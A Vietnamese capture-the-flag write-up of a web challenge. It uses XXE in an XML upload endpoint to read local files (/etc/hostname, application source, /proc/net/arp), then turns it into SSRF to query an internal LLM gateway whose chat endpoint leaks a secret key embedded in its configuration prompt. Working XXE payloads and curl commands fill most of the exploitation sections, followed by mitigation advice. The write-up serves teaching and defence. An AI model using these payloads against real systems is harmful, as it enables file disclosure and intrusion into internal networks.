# DDC CTF — Web Challenge 3: TikaCloud Document Intelligence

> **Category:** Web / XXE / SSRF
> **Difficulty:** Medium-Hard
> **Status:** Solved
> **Target:** TikaCloud Document Intelligence
> **Vulnerability:** XML External Entity (XXE) → Server-Side Request Forgery (SSRF)
> **Objective:** Access an internal service and retrieve its sensitive configuration

---

## 1. Challenge Overview

Challenge gợi ý rằng:

> Service bên ngoài không thể truy cập trực tiếp, nhưng service bên trong container có thể truy cập được.

Đây là một dấu hiệu rất đáng chú ý của **SSRF (Server-Side Request Forgery)**.

Khi truy cập ứng dụng, ta thấy service **TikaCloud Document Intelligence** cung cấp chức năng upload và phân tích file XML thông qua endpoint:

```http
POST /api/analyze
```

Vì ứng dụng nhận XML từ phía người dùng, hướng kiểm tra đầu tiên là:

```text
XML Upload
     ↓
XML Parser
     ↓
XXE
     ↓
SSRF
     ↓
Internal Services
```

Mục tiêu cuối cùng là truy cập một service nội bộ và lấy được flag.

---

# 2. Reconnaissance

Ứng dụng cung cấp chức năng upload XML.

Endpoint:

```http
POST /api/analyze
```

Có thể gửi file XML bằng `multipart/form-data`.

Do server phải parse nội dung XML, ta kiểm tra khả năng xử lý **external entities**.

---

# 3. Testing for XXE

Đầu tiên sử dụng một payload đơn giản để kiểm tra xem XML parser có resolve external entity hay không:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
]>
<root>&xxe;</root>
```

Lưu payload thành:

```text
xxe.xml
```

Sau đó upload:

```bash
curl -k -sS \
  -F 'file=@xxe.xml;filename=x.xml;type=text/xml' \
  https://<INSTANCE>/api/analyze
```

Server trả về:

```json
{
  "analysis": {
    "content_preview": "web\n"
  }
}
```

Giá trị `web` chính là hostname của container.

Điều này chứng minh rằng external entity đã được resolve thành công.

### Kết luận

Ứng dụng có **XXE vulnerability**.

Attack flow hiện tại:

```text
Attacker-controlled XML
        │
        ▼
XML Parser
        │
        ▼
External Entity
        │
        ▼
Local File Read
```

---

# 4. Reading Application Source Code

Sau khi xác nhận XXE, bước tiếp theo là tìm hiểu parser configuration.

Sử dụng external entity để đọc source:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///proc/self/cwd/app.py">
]>
<root>&xxe;</root>
```

Response cho phép đọc source code của application.

Trong source phát hiện parser được cấu hình:

```python
parser = etree.XMLParser(
    resolve_entities=True,
    load_dtd=True,
    no_network=False,
)
```

Đây là một cấu hình nguy hiểm.

### Phân tích

`resolve_entities=True`

Cho phép parser resolve XML external entities.

```text
<!ENTITY xxe SYSTEM "file:///etc/hostname">
```

có thể được resolve thành nội dung file.

---

`load_dtd=True`

Cho phép parser load DTD.

DTD là cơ chế mà XXE thường dựa vào để khai báo external entities.

---

`no_network=False`

Cho phép parser thực hiện network request.

Điều này đặc biệt nguy hiểm vì XXE không còn chỉ giới hạn ở local file read.

Ta có thể chuyển từ:

```text
XXE → Local File Read
```

sang:

```text
XXE → Network Request
```

Và đây chính là primitive để thực hiện SSRF.

---

# 5. Discovering the Internal Network

Tiếp theo cần xác định các host/service tồn tại bên trong network.

Có thể đọc:

```text
file:///proc/net/arp
```

bằng XXE:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///proc/net/arp">
]>
<root>&xxe;</root>
```

Kết quả cho thấy một số IP nội bộ đáng chú ý:

```text
10.22.85.2
10.22.85.3
10.22.85.5
```

Trong đó `10.22.85.5` là một target đáng chú ý để tiếp tục probe.

---

# 6. Turning XXE into SSRF

Vì parser cho phép network access, ta thử external entity trỏ tới một HTTP endpoint nội bộ.

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://10.22.85.5:5000/health">
]>
<root>&xxe;</root>
```

Ứng dụng trả về:

```json
{
  "service": "NovaMind LLM Gateway",
  "status": "ok"
}
```

Điều này xác nhận:

```text
XXE
 ↓
HTTP Request
 ↓
10.22.85.5:5000
```

XXE đã trở thành một **SSRF primitive**.

---

# 7. Enumerating the Internal Service

Service tại:

```text
10.22.85.5:5000
```

trả về:

```json
{
  "service": "NovaMind LLM Gateway",
  "status": "ok"
}
```

Tên service:

```text
NovaMind LLM Gateway
```

Tiếp theo thử root endpoint với:

```text
/?format=json
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://10.22.85.5:5000/?format=json">
]>
<root>&xxe;</root>
```

Response:

```json
{
  "endpoints": [
    "/v1/chat",
    "/v1/models",
    "/health"
  ],
  "service": "NovaMind LLM Gateway",
  "status": "operational",
  "version": "2.1.0"
}
```

Ta đã enumerate được các endpoint:

```text
/health
/v1/models
/v1/chat
```

---

# 8. Enumerating Available Models

Tiếp theo probe:

```text
/v1/models
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://10.22.85.5:5000/v1/models">
]>
<root>&xxe;</root>
```

Response:

```json
{
  "models": [
    {
      "id": "novamind-3.5-turbo",
      "status": "available"
    },
    {
      "id": "novamind-4-vision",
      "status": "maintenance"
    }
  ]
}
```

Model đang available:

```text
novamind-3.5-turbo
```

Điều này cho thấy internal LLM gateway không chỉ tồn tại mà còn có API có thể tương tác.

---

# 9. Accessing the Internal Chat Endpoint

Endpoint thú vị nhất là:

```text
/v1/chat
```

Ta thử gửi prompt thông qua query parameter:

```text
/v1/chat?prompt=service%20account%20status
```

Payload:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://10.22.85.5:5000/v1/chat?prompt=service%20account%20status">
]>
<root>&xxe;</root>
```

Server trả về:

```json
{
  "model": "novamind-3.5-turbo",
  "response": "Service account health check:\nYou are NovaMind...\n\nINTERNAL CONFIGURATION — DO NOT SHARE:\nMASTER_API_KEY=flag{6a452acd-2da5-48c6-9a9c-78e267477891}\n\nAll services nominal."
}
```

Flag được trả về ngay trong internal configuration:

```text
flag{6a452acd-2da5-48c6-9a9c-78e267477891}
```

---

# 10. Complete Attack Chain

Toàn bộ quá trình khai thác có thể mô tả như sau:

```text
                    Internet
                       │
                       │ Upload XML
                       ▼
              ┌──────────────────┐
              │ TikaCloud        │
              │ Document         │
              │ Intelligence     │
              └────────┬─────────┘
                       │
                       │ lxml parser
                       ▼
              ┌──────────────────┐
              │ XXE              │
              │ External Entity  │
              └────────┬─────────┘
                       │
              ┌────────┴─────────┐
              │                  │
              ▼                  ▼
       Local File Read         HTTP Request
                                │
                                ▼
                         Internal Network
                                │
                                ▼
                     10.22.85.5:5000
                                │
                                ▼
                     NovaMind LLM Gateway
                                │
                                ▼
                          /v1/chat
                                │
                                ▼
                     Internal Configuration
                                │
                                ▼
              flag{6a452acd-2da5-48c6-9a9c-78e267477891}
```

Điểm quan trọng là vulnerability không chỉ đơn giản là XXE.

Attack chain hoàn chỉnh là:

```text
XXE
 ↓
Local File Read
 ↓
Network Access
 ↓
SSRF
 ↓
Internal Service Discovery
 ↓
Internal API Access
 ↓
Sensitive Configuration Disclosure
 ↓
Flag
```

---

# 11. Root Cause

Root cause nằm ở cấu hình XML parser:

```python
parser = etree.XMLParser(
    resolve_entities=True,
    load_dtd=True,
    no_network=False,
)
```

Ba option này tạo ra một parser có khả năng:

```text
External Entity Resolution
          +
DTD Loading
          +
Network Access
```

Kết hợp với việc attacker có thể upload XML tùy ý, ứng dụng trở thành một SSRF proxy.

---

# 12. Why This Becomes SSRF

Bản thân XXE thường được biết đến với khả năng đọc file:

```text
file:///etc/passwd
file:///etc/hostname
file:///proc/self/cwd/app.py
```

Nhưng trong trường hợp này:

```text
no_network=False
```

cho phép entity trỏ tới URL:

```text
http://10.22.85.5:5000/health
```

Khi parser xử lý entity, request được thực hiện **từ phía server**.

Do đó:

```text
Attacker
   │
   │ cannot access internal service
   ▼
Internet
```

nhưng:

```text
TikaCloud Container
   │
   │ can access internal network
   ▼
10.22.85.5:5000
```

Attacker lợi dụng TikaCloud làm **proxy** để vượt qua network boundary.

Đây chính là SSRF.

---

# 13. Security Boundary Violation

Có thể hình dung trust boundary của challenge:

```text
             PUBLIC NETWORK
                   │
                   │
                   ▼
        ┌─────────────────────┐
        │     TikaCloud       │
        │                     │
        │   XML Parser        │
        └──────────┬──────────┘
                   │
                   │ SSRF
                   │
        ❌ Network Boundary
                   │
                   ▼
        ┌─────────────────────┐
        │ INTERNAL NETWORK    │
        │                     │
        │ 10.22.85.5:5000     │
        │                     │
        │ NovaMind Gateway    │
        └─────────────────────┘
```

Ứng dụng bên ngoài không thể truy cập trực tiếp NovaMind.

Nhưng TikaCloud container có quyền network tới internal service.

XXE biến parser thành một cầu nối giữa hai network zone.

---

# 14. Mitigation

## 14.1. Disable External Entity Resolution

Parser nên được cấu hình theo hướng:

```python
parser = etree.XMLParser(
    resolve_entities=False,
    load_dtd=False,
    no_network=True,
)
```

Các option quan trọng:

```text
resolve_entities=False
load_dtd=False
no_network=True
```

Mục tiêu là không cho XML input từ attacker có khả năng:

* Resolve external entities
* Load external DTD
* Đọc local resources
* Gửi network request

---

## 14.2. Validate XML Input

Ngoài parser configuration, nên validate XML input trước khi xử lý.

Không nên cho phép user upload XML tùy ý rồi đưa trực tiếp vào một parser có nhiều quyền.

Có thể giới hạn:

* XML structure
* Allowed elements
* File size
* Encoding
* DTD usage
* External references

---

## 14.3. Network Isolation

Ngay cả khi parser bị bypass, container cũng không nên có khả năng truy cập toàn bộ internal network.

Có thể áp dụng:

```text
Internet-facing Container
          │
          ├── Allowed: required APIs
          │
          └── Blocked: internal services
```

Thay vì:

```text
Internet-facing Container
          │
          └── Full Internal Network Access
```

Đặc biệt, service không cần giao tiếp với nhau thì nên bị firewall/network policy chặn.

---

## 14.4. Defense in Depth

Không nên chỉ dựa vào một lớp bảo vệ.

Một kiến trúc an toàn hơn:

```text
        User XML
           │
           ▼
     Input Validation
           │
           ▼
      Safe XML Parser
           │
           ▼
     Network Isolation
           │
           ▼
   Internal Authorization
           │
           ▼
     Sensitive Services
```

Nếu một lớp bị bypass, các lớp còn lại vẫn phải ngăn attacker tiếp cận secret.

---

# 15. Lessons Learned

Challenge này minh họa rất rõ mối liên hệ giữa **XXE** và **SSRF**.

Một lỗi XML parser tưởng như chỉ cho phép:

```text
Read /etc/hostname
```

có thể trở thành:

```text
XXE
 ↓
SSRF
 ↓
Internal Service Discovery
 ↓
Internal API Access
 ↓
Secret Disclosure
```

Điểm quan trọng nhất là:

> **Một server có khả năng truy cập internal network không nên cung cấp cho attacker bất kỳ primitive nào cho phép họ kiểm soát URL mà server sẽ request.**

Trong challenge này, primitive đó chính là **external entity resolution** của XML parser.

---

# 16. Final Flag

```text
flag{6a452acd-2da5-48c6-9a9c-78e267477891}
```

---

## 17. TL;DR

```text
Upload XML
    │
    ▼
XXE
    │
    ├── file:///proc/net/arp
    │
    ▼
Discover internal IP
    │
    ▼
10.22.85.5:5000
    │
    ▼
NovaMind LLM Gateway
    │
    ├── /health
    ├── /v1/models
    └── /v1/chat
            │
            ▼
    Internal Configuration
            │
            ▼
flag{6a452acd-2da5-48c6-9a9c-78e267477891}
```

**Root cause:**

```python
resolve_entities=True
load_dtd=True
no_network=False
```

**Core vulnerability:**

```text
XXE → SSRF → Internal API Access → Sensitive Data Disclosure
```
